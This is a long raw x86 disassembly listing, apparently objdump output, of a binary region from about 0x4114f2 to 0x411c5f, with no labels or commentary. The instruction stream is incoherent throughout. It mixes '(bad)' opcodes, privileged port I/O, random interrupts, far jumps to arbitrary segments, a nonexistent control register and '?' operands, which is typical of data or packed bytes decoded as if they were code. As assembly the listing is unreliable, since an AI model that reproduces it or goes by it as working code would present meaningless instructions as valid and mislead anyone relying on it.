  4114f2:	ror    DWORD PTR [edi],1
  4114f4:	adc    eax,0xcaa4ea49
  4114f9:	xor    DWORD PTR ds:0xf692b8b2,ecx
  4114ff:	xor    ah,ah
  411501:	aas    
  411502:	sbb    esp,edi
  411504:	nop
  411505:	inc    ebp
  411506:	fsubr  DWORD PTR [ecx+0x3d]
  411509:	outs   dx,BYTE PTR ds:[esi]
  41150a:	in     eax,0xa0
  41150c:	ret    0x57c3
  41150f:	fsub   st,st(7)
  411511:	inc    ecx
  411512:	push   eax
  411513:	out    dx,eax
  411514:	push   esp
  411515:	dec    ecx
  411516:	and    ah,ah
  411518:	int    0x80
  41151a:	ins    BYTE PTR es:[edi],dx
  41151b:	in     eax,dx
  41151c:	mov    edx,0xf6f9654
  411521:	inc    eax
  411522:	jbe    0x411558
  411524:	out    0xab,eax
  411526:	neg    DWORD PTR [edi]
  411528:	xlat   BYTE PTR ds:[ebx]
  411529:	mov    cl,0xc9
  41152b:	test   DWORD PTR [esi+eax*1],esp
  41152e:	mov    ebx,0x157f4e4e
  411533:	aam    0xf1
  411535:	jecxz  0x4114d9
  411537:	stos   DWORD PTR es:[edi],eax
  411538:	xchg   edi,eax
  411539:	xchg   DWORD PTR [ebp+0x23],eax
  41153c:	fadd   DWORD PTR [ecx+0x6d31ad69]
  411542:	mov    ah,0xe4
  411544:	push   ds
  411545:	add    eax,0xdc1dc682
  41154a:	push   ecx
  41154b:	and    al,0x52
  41154d:	stos   DWORD PTR es:[edi],eax
  41154e:	add    DWORD PTR [edi+0x1b],edx
  411551:	daa    
  411552:	(bad)  
  411553:	xchg   esi,eax
  411554:	ins    DWORD PTR es:[edi],dx
  411555:	mov    dh,0xaa
  411557:	adc    BYTE PTR [eax],dl
  411559:	bound  esp,QWORD PTR [ebx]
  41155b:	gs jno 0x411570
  41155e:	pop    ss
  41155f:	pop    ebp
  411560:	(bad)  
  411562:	pop    ecx
  411563:	adc    edx,DWORD PTR [esi+ecx*4-0x30]
  411567:	and    dh,BYTE PTR [ebx]
  411569:	mov    DWORD PTR [ecx-0x5d],edx
  41156c:	mov    eax,ds:0xf0e7fce0
  411571:	cmc    
  411572:	sub    BYTE PTR [edi-0xd381d13],ch
  411578:	(bad)  
  411579:	in     al,0xaf
  41157b:	popa   
  41157c:	arpl   si,cx
  41157e:	push   cs
  41157f:	sbb    al,0x9d
  411581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411582:	lea    eax,[edx-0x5d1f71e8]
  411588:	aam    0x17
  41158a:	and    esp,DWORD PTR [ebp-0x57d907f]
  411590:	cwde   
  411591:	pop    eax
  411592:	adc    al,0x30
  411594:	std    
  411595:	sbb    eax,ebp
  411597:	aad    0x6b
  411599:	push   esp
  41159a:	scas   eax,DWORD PTR es:[edi]
  41159b:	aad    0x1e
  41159d:	or     ah,ah
  41159f:	xchg   DWORD PTR [ebp+0x7d],esp
  4115a2:	loopne 0x411592
  4115a4:	in     eax,dx
  4115a5:	das    
  4115a6:	arpl   dx,dx
  4115a8:	ins    BYTE PTR es:[edi],dx
  4115a9:	xchg   edi,eax
  4115aa:	xor    BYTE PTR [esi],0xb7
  4115ad:	daa    
  4115ae:	stc    
  4115af:	(bad)  [edx]
  4115b1:	cmp    ebx,esp
  4115b3:	cs dec eax
  4115b5:	mov    edx,0xb4a64e7b
  4115ba:	call   0x10b209f7
  4115bf:	xchg   edx,eax
  4115c0:	push   0x37
  4115c2:	cli    
  4115c3:	iret   
  4115c4:	sti    
  4115c5:	push   0x6b0f776b
  4115ca:	neg    BYTE PTR [esi]
  4115cc:	push   0x73
  4115ce:	jg     0x411647
  4115d0:	jg     0x41160b
  4115d2:	mov    eax,ds:0xaa7f4001
  4115d7:	fcmovbe st,st(5)
  4115d9:	clc    
  4115da:	addr16 push 0x32
  4115dd:	jno    0x4115dc
  4115df:	or     eax,0xd2da8b39
  4115e4:	push   edi
  4115e5:	out    dx,al
  4115e6:	adc    cl,al
  4115e8:	in     eax,0x41
  4115ea:	xchg   esp,eax
  4115eb:	push   esi
  4115ec:	into   
  4115ed:	nop
  4115ee:	xchg   ecx,eax
  4115ef:	js     0x41157f
  4115f1:	inc    ebp
  4115f2:	mov    bh,0x72
  4115f4:	adc    BYTE PTR [ebx+0x79730853],bh
  4115fa:	ins    BYTE PTR es:[edi],dx
  4115fb:	cs dec sp
  4115fe:	dec    esp
  4115ff:	mov    dh,0xa0
  411601:	fcmovu st,st(6)
  411603:	sbb    dl,BYTE PTR [ebp-0x12]
  411606:	pop    ebp
  411607:	in     eax,dx
  411608:	cli    
  411609:	xchg   ecx,eax
  41160a:	loop   0x41158c
  41160c:	or     ah,BYTE PTR [esi-0x37]
  41160f:	sbb    DWORD PTR [ecx],edi
  411611:	addr16 cwde 
  411613:	popf   
  411614:	retf   0x8406
  411617:	aas    
  411618:	shl    BYTE PTR [ebx+0x67f1fa67],cl
  41161e:	mov    ds,WORD PTR ss:[edx-0x5d86b19]
  411625:	nop
  411626:	ins    BYTE PTR es:[edi],dx
  411627:	in     eax,0x82
  411629:	stos   DWORD PTR es:[edi],eax
  41162a:	outs   dx,BYTE PTR ds:[esi]
  41162b:	es fs aas 
  41162e:	(bad)  
  41162f:	and    ebp,edx
  411631:	rcl    BYTE PTR [edi-0x1b],cl
  411634:	inc    ebx
  411635:	jge    0x411633
  411637:	jecxz  0x411650
  411639:	aaa    
  41163a:	jno    0x41161a
  41163c:	ror    BYTE PTR [edi],0x3
  41163f:	mov    ds:0x90fe3d97,al
  411644:	out    0x41,eax
  411646:	xchg   DWORD PTR [ecx-0x53],ebx
  411649:	ds hlt 
  41164b:	imul   ebp,DWORD PTR [edx+0x17],0xbf0efa9f
  411652:	pop    edi
  411653:	cmp    al,0x16
  411655:	xchg   ebp,eax
  411656:	xchg   ebx,eax
  411657:	mov    dh,0xd0
  411659:	fisttp WORD PTR [ecx-0x6a]
  41165c:	pop    ecx
  41165d:	mov    ch,0x56
  41165f:	or     dl,BYTE PTR [ebp+0x70]
  411662:	outs   dx,DWORD PTR ds:[esi]
  411663:	and    esp,DWORD PTR [esi]
  411665:	xchg   esp,eax
  411666:	sbb    eax,0x7c52f90f
  41166b:	mov    ebx,0x808122b3
  411670:	inc    esp
  411671:	push   edx
  411672:	adc    ah,dh
  411674:	das    
  411675:	imul   BYTE PTR [edi]
  411677:	sar    DWORD PTR [ebx],0xa0
  41167a:	cmp    al,BYTE PTR [ebp-0x6d]
  41167d:	mov    esi,0xfb71bca0
  411682:	pop    eax
  411683:	loopne 0x411662
  411685:	nop
  411686:	enter  0xf185,0x73
  41168a:	xor    DWORD PTR [ebx+0x4f1c1d11],ecx
  411690:	stos   DWORD PTR es:[edi],eax
  411691:	dec    ebx
  411692:	in     al,dx
  411693:	mov    edx,0x905ed16
  411698:	dec    ebp
  411699:	ret    0x60b
  41169c:	in     eax,0xa9
  41169e:	pop    ss
  41169f:	add    BYTE PTR [ebx+eiz*4-0x53fa90ef],dl
  4116a6:	es add al,0x5e
  4116a9:	loope  0x41166c
  4116ab:	inc    eax
  4116ac:	ins    DWORD PTR es:[edi],dx
  4116ad:	outs   dx,DWORD PTR ds:[esi]
  4116ae:	mov    cl,0xcb
  4116b0:	jecxz  0x411723
  4116b2:	(bad)  
  4116b3:	cs cdq 
  4116b5:	into   
  4116b6:	je     0x411685
  4116b8:	adc    esp,DWORD PTR [eax-0x1daab042]
  4116be:	cmp    eax,0x3a6caa53
  4116c3:	call   0xbe725714
  4116c8:	div    BYTE PTR [edx]
  4116ca:	xchg   edx,eax
  4116cb:	shr    DWORD PTR [esi-0x5b3c8297],cl
  4116d1:	xor    esp,DWORD PTR [esp+edx*1-0x47c48459]
  4116d8:	jbe    0x411698
  4116da:	aam    0x80
  4116dc:	mov    DWORD PTR [ebp+0x2b323050],esi
  4116e2:	xchg   edx,eax
  4116e3:	dec    ecx
  4116e4:	das    
  4116e5:	pop    ds
  4116e6:	das    
  4116e7:	xchg   ebp,eax
  4116e8:	xchg   edx,eax
  4116e9:	rcl    esp,cl
  4116eb:	mov    edx,0x9629d8cd
  4116f0:	cmp    ebx,ebx
  4116f2:	jecxz  0x41172b
  4116f4:	lea    esp,[edx-0x24]
  4116f7:	and    bh,BYTE PTR ds:0xef7c63e2
  4116fd:	xor    eax,0x30f86e68
  411702:	aaa    
  411703:	pop    esi
  411704:	int3   
  411705:	jecxz  0x4116e8
  411707:	out    0x62,al
  411709:	mov    cl,0xe5
  41170b:	xchg   ecx,eax
  41170c:	sub    eax,DWORD PTR [edi+ebx*1]
  41170f:	out    dx,eax
  411710:	inc    ebp
  411711:	or     BYTE PTR [edi-0x10],dl
  411714:	cwde   
  411715:	ret    0x2944
  411718:	or     al,0x6f
  41171a:	inc    eax
  41171b:	mov    ebp,0xb084835
  411720:	es pop ds
  411722:	cld    
  411723:	in     al,dx
  411724:	shl    dh,1
  411726:	test   BYTE PTR ss:[ebp+0x4d],0x14
  41172b:	pop    es
  41172c:	gs retf 
  41172e:	push   ds
  41172f:	add    eax,0xfe504c68
  411734:	mov    ecx,0x97ed31a7
  411739:	mov    ah,0x49
  41173b:	jl     0x411720
  41173d:	out    0x7e,al
  41173f:	push   ebp
  411740:	cs and eax,0x231d852a
  411746:	div    BYTE PTR [eax+ebp*4-0x63ed898c]
  41174d:	out    0xca,al
  41174f:	into   
  411750:	ds pop edi
  411752:	jl     0x411752
  411754:	cmc    
  411755:	push   edi
  411756:	fidiv  WORD PTR [edi-0x3a]
  411759:	das    
  41175a:	push   ebx
  41175b:	ja     0x4117a8
  41175d:	iret   
  41175e:	daa    
  41175f:	jb     0x4116ea
  411761:	mov    DWORD PTR [ebp+0x6b138501],esi
  411767:	mov    al,BYTE PTR [edx-0x71]
  41176a:	dec    ebx
  41176b:	loop   0x41177e
  41176d:	push   ebp
  41176e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41176f:	adc    ecx,DWORD PTR [ecx+0x6cfbaf2c]
  411775:	clc    
  411776:	aas    
  411777:	push   edx
  411778:	pop    eax
  411779:	(bad)  
  41177a:	hlt    
  41177b:	je     0x4117e9
  41177d:	add    DWORD PTR [esi+0x6dbcd4ca],ecx
  411783:	adc    eax,DWORD PTR [edx-0x37]
  411786:	ja     0x41174a
  411788:	inc    ebx
  411789:	idiv   DWORD PTR [eax]
  41178b:	cwde   
  41178c:	mov    ebx,0x2c0f9d14
  411791:	outs   dx,BYTE PTR ds:[esi]
  411792:	repnz pop esp
  411794:	outs   dx,DWORD PTR ds:[esi]
  411795:	xor    dh,BYTE PTR [ebp+0x6f7a07a6]
  41179b:	mov    ebx,0x56a06de4
  4117a0:	not    DWORD PTR [eax+0x79373e5a]
  4117a6:	inc    ebp
  4117a7:	popa   
  4117a8:	fistp  DWORD PTR [ecx]
  4117aa:	mov    cl,0x46
  4117ac:	nop
  4117ad:	push   es
  4117ae:	pop    edx
  4117af:	scas   eax,DWORD PTR es:[edi]
  4117b0:	repnz lea ebx,[edi]
  4117b3:	sahf   
  4117b4:	cmp    eax,0x47216499
  4117b9:	or     edi,DWORD PTR [esi-0x195161ba]
  4117bf:	push   ebp
  4117c0:	jmp    0x411795
  4117c2:	cmc    
  4117c3:	scas   al,BYTE PTR es:[edi]
  4117c4:	(bad)  
  4117c5:	(bad)  
  4117c6:	jle    0x41182a
  4117c8:	adc    ah,BYTE PTR [ebx]
  4117ca:	pusha  
  4117cb:	jmp    0x7dd8:0x440ec559
  4117d2:	add    dh,BYTE PTR [edi]
  4117d4:	pop    ss
  4117d5:	call   0x11500007
  4117da:	inc    esp
  4117db:	fild   DWORD PTR [ecx-0xea2e0c5]
  4117e1:	imul   DWORD PTR [ebx-0x40]
  4117e4:	das    
  4117e5:	test   esp,edi
  4117e7:	mov    ebp,0xc248b15a
  4117ec:	pusha  
  4117ed:	in     al,dx
  4117ee:	and    eax,0xa1d1a1b5
  4117f3:	mov    al,ds:0xf7bf0d50
  4117f8:	cmp    eax,0x93408dc0
  4117fd:	xor    cl,BYTE PTR [edx+0xed675d4]
  411803:	dec    ebx
  411804:	pusha  
  411805:	out    0xa3,eax
  411807:	nop    eax
  41180a:	add    esp,DWORD PTR [edx]
  41180c:	pop    ds
  41180d:	pop    edx
  41180e:	in     eax,dx
  41180f:	or     dl,0xf2
  411812:	mov    dh,0xeb
  411814:	mov    eax,ds:0x4a050e1
  411819:	cwde   
  41181a:	adc    ch,BYTE PTR [esi+0x23]
  41181d:	xchg   esi,eax
  41181e:	jne    0x41185c
  411820:	sbb    DWORD PTR [ecx],0x80629948
  411826:	push   ss
  411827:	inc    ebx
  411828:	inc    ebx
  411829:	and    al,0x49
  41182b:	pop    ds
  41182c:	and    dh,dl
  41182e:	scas   eax,DWORD PTR es:[edi]
  41182f:	and    BYTE PTR [ecx-0x2851986e],0x19
  411836:	test   BYTE PTR [ebp+eiz*8-0x7dd2282a],ch
  41183d:	lods   eax,DWORD PTR ds:[esi]
  41183e:	test   eax,0x5edad354
  411843:	dec    ebx
  411844:	mov    ch,BYTE PTR [eax+0x3704eddd]
  41184a:	das    
  41184b:	js     0x411873
  41184d:	mov    al,0x62
  41184f:	fs jns 0x4118a1
  411852:	dec    esp
  411853:	inc    ecx
  411854:	jg     0x411834
  411856:	sub    al,BYTE PTR [ecx]
  411858:	inc    esp
  411859:	jmp    0xd6c6e0c2
  41185e:	repnz xchg esp,eax
  411860:	add    esp,DWORD PTR [esi]
  411862:	call   0xb7be14a2
  411867:	or     BYTE PTR [ecx+0x44],cl
  41186a:	das    
  41186b:	jb     0x411817
  41186d:	int    0xc0
  41186f:	shl    DWORD PTR [ebx],0x5e
  411872:	pop    ecx
  411873:	not    BYTE PTR [edx-0x2]
  411876:	lods   eax,DWORD PTR ds:[esi]
  411877:	dec    ebp
  411878:	lock faddp st(2),st
  41187b:	sahf   
  41187c:	shl    DWORD PTR [esi-0x32a63911],0x6e
  411883:	(bad)  
  411884:	mov    ch,0x3b
  411886:	dec    edi
  411887:	(bad)  
  411888:	fnop   
  41188a:	outs   dx,BYTE PTR ds:[esi]
  41188b:	popf   
  41188c:	cli    
  41188d:	push   0xffffffaf
  41188f:	fs ret 0x1e2f
  411893:	iret   
  411894:	mov    al,0xaf
  411896:	stos   BYTE PTR es:[edi],al
  411897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411898:	xchg   esp,eax
  411899:	ins    BYTE PTR es:[edi],dx
  41189a:	loope  0x41188e
  41189c:	jnp    0x41185b
  41189e:	mov    WORD PTR [ebx-0x80],es
  4118a1:	in     al,dx
  4118a2:	sub    al,0x57
  4118a4:	jmp    0xbb279937
  4118a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118aa:	mov    eax,DWORD PTR [ebx-0x65]
  4118ad:	sbb    ebp,DWORD PTR [esi+0x10f4e51a]
  4118b3:	addr16 in al,0x4b
  4118b6:	inc    esi
  4118b7:	jae    0x41187e
  4118b9:	dec    edi
  4118ba:	jb     0x411913
  4118bc:	retf   
  4118bd:	or     bh,bh
  4118bf:	dec    ecx
  4118c0:	mov    bl,0x2f
  4118c2:	pop    ss
  4118c3:	loope  0x411872
  4118c5:	xor    dl,cl
  4118c7:	add    DWORD PTR [edi],esi
  4118c9:	jns    0x4118bd
  4118cb:	dec    edx
  4118cc:	int    0x63
  4118ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118cf:	pop    esi
  4118d0:	inc    edi
  4118d1:	inc    esp
  4118d2:	mov    ax,?
  4118d5:	xchg   esp,eax
  4118d6:	mov    eax,ds:0x5d07f85b
  4118db:	xchg   edi,ecx
  4118dd:	(bad)  
  4118df:	jb     0x4118d2
  4118e1:	jbe    0x41194f
  4118e3:	add    al,BYTE PTR [ebx]
  4118e5:	sub    ebx,ebx
  4118e7:	push   0x22
  4118e9:	add    dl,BYTE PTR [ebx+0x1bde1185]
  4118ef:	pop    es
  4118f0:	adc    BYTE PTR [eax+0x38],0xfe
  4118f4:	test   al,dh
  4118f6:	into   
  4118f7:	mov    al,0x12
  4118f9:	sbb    eax,0xafa605
  4118fe:	lds    esi,FWORD PTR ds:0x4e61b5e
  411904:	jg     0x411913
  411906:	pop    ds
  411907:	(bad)  
  411908:	jae    0x411918
  41190a:	dec    edi
  41190b:	div    dl
  41190d:	sub    edi,DWORD PTR [eax]
  41190f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411910:	jne    0x411967
  411912:	xchg   edx,eax
  411913:	cmp    eax,0xfba2811e
  411918:	enter  0xf810,0x4d
  41191c:	pop    ebp
  41191d:	add    al,0x99
  41191f:	sahf   
  411920:	add    cl,dh
  411922:	jmp    0xe574cb74
  411927:	pop    eax
  411928:	aam    0x14
  41192a:	sahf   
  41192b:	fnstsw WORD PTR [esi]
  41192d:	cld    
  41192e:	cli    
  41192f:	lods   al,BYTE PTR ds:[esi]
  411930:	int    0x10
  411932:	xchg   ebp,eax
  411933:	out    dx,eax
  411934:	pop    edx
  411935:	cmp    edi,0x36789496
  41193b:	ror    BYTE PTR [ebp-0x1a4bcd1d],1
  411941:	xchg   ecx,eax
  411942:	inc    edx
  411943:	das    
  411944:	sub    DWORD PTR [esi],ebx
  411946:	sbb    ecx,DWORD PTR [edi]
  411948:	cmp    esp,DWORD PTR [edx+0x3178b17e]
  41194e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41194f:	retf   
  411950:	fst    DWORD PTR [esp+ebx*1-0x16f2ef5d]
  411957:	lods   eax,DWORD PTR ds:[esi]
  411958:	pop    edx
  411959:	popf   
  41195a:	inc    BYTE PTR [esi+0x33]
  41195d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41195e:	shl    DWORD PTR [ebp+0x31a2986d],1
  411964:	jp     0x411949
  411966:	push   ecx
  411967:	mov    eax,0x35a8a530
  41196c:	mov    cl,0xc1
  41196e:	xchg   dh,bl
  411970:	dec    eax
  411971:	and    DWORD PTR [esi],esi
  411973:	loopne 0x411986
  411975:	jmp    0x31dfe3fb
  41197a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41197b:	imul   esi,DWORD PTR [eax],0x2d
  41197e:	mov    ds:0xcf6d8b5f,eax
  411983:	mov    ebx,0x3ae43d73
  411988:	ffreep st(3)
  41198a:	xchg   edx,edi
  41198c:	adc    al,0x8f
  41198e:	cs xchg edi,eax
  411990:	shld   DWORD PTR [edx+0x4e1dafff],eax,0xc1
  411998:	pop    DWORD PTR [ecx]
  41199a:	ja     0x4119e7
  41199c:	loope  0x411a02
  41199e:	add    al,0xd5
  4119a0:	(bad)  
  4119a1:	(bad)  
  4119a2:	icebp  
  4119a3:	add    edi,esi
  4119a5:	pushf  
  4119a6:	cmc    
  4119a7:	int    0x93
  4119a9:	(bad)  
  4119aa:	sbb    DWORD PTR [edx+edi*2],esp
  4119ad:	dec    ebx
  4119ae:	repnz pusha 
  4119b0:	pop    ds
  4119b1:	bound  ebp,QWORD PTR [edi-0x28]
  4119b4:	xchg   esi,eax
  4119b5:	scas   eax,DWORD PTR es:[edi]
  4119b6:	pop    ebp
  4119b7:	daa    
  4119b8:	mov    al,0x77
  4119ba:	or     ch,BYTE PTR [eax-0x1a]
  4119bd:	icebp  
  4119be:	sar    bl,1
  4119c0:	inc    ebp
  4119c1:	cmp    BYTE PTR [esi+0x70da621a],cl
  4119c7:	in     al,0xba
  4119c9:	mov    WORD PTR [edx+0x6b],cs
  4119cc:	and    ch,al
  4119ce:	call   0x1167a599
  4119d3:	jae    0x411a44
  4119d5:	(bad)  
  4119d7:	ds mov ebp,0x26978564
  4119dd:	jae    0x411a3e
  4119df:	jecxz  0x41196d
  4119e1:	and    BYTE PTR [eax+0x4b],ch
  4119e4:	inc    ebp
  4119e5:	ins    BYTE PTR es:[edi],dx
  4119e6:	push   es
  4119e7:	comiss xmm0,xmm1
  4119ea:	jb     0x411a24
  4119ec:	or     BYTE PTR [esi],ah
  4119ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119ef:	jnp    0x411995
  4119f1:	loopne 0x4119bd
  4119f3:	imul   ebp,DWORD PTR [ecx],0x719d5974
  4119f9:	fldcw  WORD PTR [esi+0xcc57ff1]
  4119ff:	cmp    ecx,esp
  411a01:	bound  esp,QWORD PTR [esi]
  411a03:	out    dx,eax
  411a04:	sub    bl,BYTE PTR [ebx]
  411a06:	cmp    DWORD PTR ds:0x2ce5ce8c,ebx
  411a0c:	push   0x2e
  411a0e:	loope  0x411a23
  411a10:	int    0x87
  411a12:	pop    ds
  411a13:	inc    ebx
  411a14:	imul   eax,DWORD PTR [ecx-0x4d],0x6e238e9b
  411a1b:	push   edx
  411a1c:	pop    ss
  411a1d:	fstp   DWORD PTR ds:0xc4a5b308
  411a23:	mov    WORD PTR [edi-0x5b],fs
  411a26:	jnp    0x411a78
  411a28:	pop    eax
  411a29:	xor    BYTE PTR [edx-0x54],cl
  411a2c:	mov    ?,WORD PTR [ebx-0xf]
  411a2f:	cmp    al,0xb4
  411a31:	pop    esi
  411a32:	je     0x411a30
  411a34:	cwd    
  411a36:	jmp    0x411a3d
  411a38:	out    dx,al
  411a39:	sub    eax,DWORD PTR [esi+0x4c]
  411a3c:	push   edi
  411a3d:	add    bh,bl
  411a3f:	inc    ebp
  411a40:	inc    edi
  411a41:	je     0x4119d8
  411a43:	mov    dh,0xa0
  411a45:	and    eax,0xdefeb6c0
  411a4a:	dec    edx
  411a4b:	pop    edi
  411a4c:	pop    edx
  411a4d:	mov    ds:0xedc65f2c,eax
  411a52:	pop    ds
  411a53:	mov    dh,BYTE PTR [ebx-0x34]
  411a56:	mov    ecx,cr5
  411a59:	aas    
  411a5a:	int3   
  411a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a5c:	push   eax
  411a5d:	into   
  411a5e:	push   0xc98b1d7d
  411a63:	sub    al,0x9a
  411a65:	or     esi,0xffffffd5
  411a68:	addr16 push eax
  411a6a:	sar    DWORD PTR ds:0xc85e4f53,cl
  411a70:	loop   0x411a39
  411a72:	mov    bl,0x6
  411a74:	fs hlt 
  411a76:	sub    BYTE PTR [eiz*4+0x402d5bed],ah
  411a7d:	and    bl,BYTE PTR [ecx-0x1c]
  411a80:	mov    eax,0x15e5d18d
  411a85:	leave  
  411a86:	outs   dx,DWORD PTR ds:[esi]
  411a87:	(bad)  
  411a88:	rcr    ecx,1
  411a8a:	sti    
  411a8b:	aas    
  411a8c:	jbe    0x411a73
  411a8e:	jne    0x411aef
  411a90:	xchg   esi,eax
  411a91:	in     eax,dx
  411a92:	jecxz  0x411a66
  411a94:	add    DWORD PTR [edx],ebp
  411a96:	lods   al,BYTE PTR ds:[esi]
  411a97:	pop    edi
  411a98:	clc    
  411a99:	out    dx,eax
  411a9a:	add    ecx,ebp
  411a9c:	xor    al,0x67
  411a9e:	mov    cs,eax
  411aa0:	jecxz  0x411ae0
  411aa2:	fild   DWORD PTR [eax+0x4a]
  411aa5:	mov    edx,0xdc51811d
  411aaa:	scas   eax,DWORD PTR es:[edi]
  411aab:	mov    edi,0x7684e28e
  411ab0:	jno    0x411a71
  411ab2:	cmp    al,0xb9
  411ab4:	dec    edi
  411ab5:	or     eax,DWORD PTR [ebx+edx*1-0x39]
  411ab9:	push   esp
  411aba:	out    0x86,al
  411abc:	add    esi,DWORD PTR [esi]
  411abe:	call   0xa549b72d
  411ac3:	fnstcw WORD PTR [ecx+ecx*2+0xbcaf9be]
  411aca:	inc    edx
  411acb:	clc    
  411acc:	lock mov eax,fs:0xca533c06
  411ad3:	and    DWORD PTR [ecx+esi*4-0x3a],edx
  411ad7:	push   edx
  411ad8:	rol    DWORD PTR [ebp+0x20],1
  411adb:	xor    eax,0x862f01ce
  411ae0:	fadd   DWORD PTR [eax+0x3c535618]
  411ae6:	loop   0x411a71
  411ae8:	lock pop es
  411aea:	dec    ecx
  411aeb:	inc    ebx
  411aec:	xchg   edi,eax
  411aed:	pop    ebx
  411aee:	lods   al,BYTE PTR ds:[esi]
  411aef:	das    
  411af0:	dec    ebp
  411af1:	inc    esp
  411af2:	pop    esi
  411af3:	repz sbb DWORD PTR [ecx+0x5fa3ebee],esi
  411afa:	push   edx
  411afb:	nop
  411afc:	sub    BYTE PTR [ebx-0x28],0x4a
  411b00:	push   eax
  411b01:	add    DWORD PTR [eax],edi
  411b03:	iret   
  411b04:	mov    cl,BYTE PTR [esi+0x51]
  411b07:	cmp    esi,DWORD PTR [esi-0x4e6da899]
  411b0d:	mov    cl,0xbe
  411b0f:	pop    esi
  411b10:	ds inc ecx
  411b12:	bnd jle 0x411ab8
  411b15:	jnp    0x411b6c
  411b17:	inc    eax
  411b18:	and    DWORD PTR [ecx+0x71],eax
  411b1b:	mov    ecx,0x819aae5b
  411b20:	dec    edx
  411b21:	jecxz  0x411b69
  411b23:	mov    edx,0x11a23294
  411b28:	fdivr  DWORD PTR [edx]
  411b2a:	xchg   esp,eax
  411b2b:	push   ss
  411b2c:	dec    esi
  411b2d:	mov    bl,0xff
  411b2f:	sbb    bl,BYTE PTR [edi-0x1c41af21]
  411b35:	push   ss
  411b36:	push   edx
  411b37:	jmp    0xbf2:0x4152a16f
  411b3e:	cmp    DWORD PTR [esi],esp
  411b40:	sahf   
  411b41:	jge    0x411b7b
  411b43:	inc    edx
  411b44:	jl     0x411b44
  411b46:	pop    edx
  411b47:	cld    
  411b48:	sahf   
  411b49:	sti    
  411b4a:	adc    dh,ch
  411b4c:	int    0x16
  411b4e:	(bad)  
  411b50:	or     DWORD PTR [esi-0x57],eax
  411b53:	retf   
  411b54:	lods   al,BYTE PTR ds:[esi]
  411b55:	add    al,0x25
  411b57:	xor    eax,0x684d5002
  411b5c:	pop    ds
  411b5d:	jmp    0x17:0xd2b902bc
  411b64:	sub    eax,0xaa1afb07
  411b69:	cmp    dh,BYTE PTR [esi+0x8]
  411b6c:	add    dh,BYTE PTR [edi]
  411b6e:	mov    ch,0xa9
  411b70:	idiv   DWORD PTR [ecx-0x2dcea717]
  411b76:	xchg   ebp,eax
  411b77:	cmp    al,bl
  411b79:	addr16 mov eax,ds
  411b7c:	in     eax,0xd
  411b7e:	sub    DWORD PTR [esi],ecx
  411b80:	pop    edx
  411b81:	push   0x5692085b
  411b86:	mov    esp,esi
  411b88:	mov    DWORD PTR [ebp-0x63],esi
  411b8b:	ins    DWORD PTR es:[edi],dx
  411b8c:	fidiv  DWORD PTR [ebx+0x57ea0d24]
  411b92:	mov    cl,0xcd
  411b94:	add    dh,dl
  411b96:	scas   eax,DWORD PTR es:[edi]
  411b97:	or     edx,DWORD PTR es:[eax+0x56]
  411b9b:	ror    BYTE PTR [ebx],1
  411b9d:	xor    al,0x18
  411b9f:	pop    edx
  411ba0:	xchg   ebp,eax
  411ba1:	push   ds
  411ba2:	and    BYTE PTR [esi],dl
  411ba4:	and    al,0xcf
  411ba6:	push   0xd7bd41a7
  411bab:	dec    esp
  411bac:	enter  0xf466,0xb5
  411bb0:	pop    edx
  411bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bb2:	scas   al,BYTE PTR es:[edi]
  411bb3:	and    dl,BYTE PTR [edi+0x55fff66]
  411bb9:	enter  0xc330,0x9
  411bbd:	and    BYTE PTR [ecx+edi*1-0x789bbcc3],al
  411bc4:	imul   BYTE PTR [edx]
  411bc6:	lahf   
  411bc7:	push   eax
  411bc8:	mov    BYTE PTR [ebx-0x653d9310],bl
  411bce:	or     bl,BYTE PTR [eax+0x5c31202c]
  411bd4:	mov    eax,ds:0xe9db8723
  411bd9:	lods   eax,DWORD PTR ds:[esi]
  411bda:	xor    dl,BYTE PTR [ebx-0x6ae62fdd]
  411be0:	push   0x93eac5bd
  411be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411be6:	inc    ebx
  411be7:	aam    0x82
  411be9:	outs   dx,DWORD PTR ds:[esi]
  411bea:	sbb    BYTE PTR [ebx-0x398ce1be],al
  411bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bf1:	popf   
  411bf2:	xchg   esi,eax
  411bf3:	int    0xc1
  411bf5:	or     BYTE PTR [ebp+eiz*1-0x7c7970d3],bh
  411bfc:	pop    edi
  411bfd:	and    ah,BYTE PTR [edx-0x242ba795]
  411c03:	adc    al,0x38
  411c05:	out    dx,eax
  411c06:	jge    0x411c33
  411c08:	jo     0x411c20
  411c0a:	leave  
  411c0b:	mov    dh,0xe3
  411c0d:	repnz push ecx
  411c0f:	xchg   ebx,eax
  411c10:	sbb    al,BYTE PTR [ecx]
  411c12:	mov    WORD PTR [esi*1-0x3453094f],?
  411c19:	cwde   
  411c1a:	add    DWORD PTR [ebp+0x4b27c235],ebx
  411c20:	ret    0x9030
  411c23:	mov    ds:0x4f70b4ba,al
  411c28:	jp     0x411ca6
  411c2a:	fs push 0x4509f814
  411c30:	xchg   DWORD PTR [ebp-0x336d584],ebp
  411c36:	out    0x4c,al
  411c38:	dec    ebx
  411c39:	lods   eax,DWORD PTR ds:[esi]
  411c3a:	icebp  
  411c3b:	in     al,0xeb
  411c3d:	and    ch,BYTE PTR [ecx]
  411c3f:	outs   dx,DWORD PTR ds:[esi]
  411c40:	scas   eax,DWORD PTR es:[edi]
  411c41:	cmp    cl,BYTE PTR cs:[edx]
  411c44:	xchg   edx,eax
  411c45:	xchg   esp,ebp
  411c47:	call   0xeec5:0x1d06c3cc
  411c4e:	dec    ecx
  411c4f:	sahf   
  411c50:	inc    DWORD PTR [edi+0x41eb701]
  411c56:	mov    al,0x8b
  411c58:	jmp    0xcbfdd4e2
  411c5d:	cwde   
  411c5e:	xchg   esi,eax
  411c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
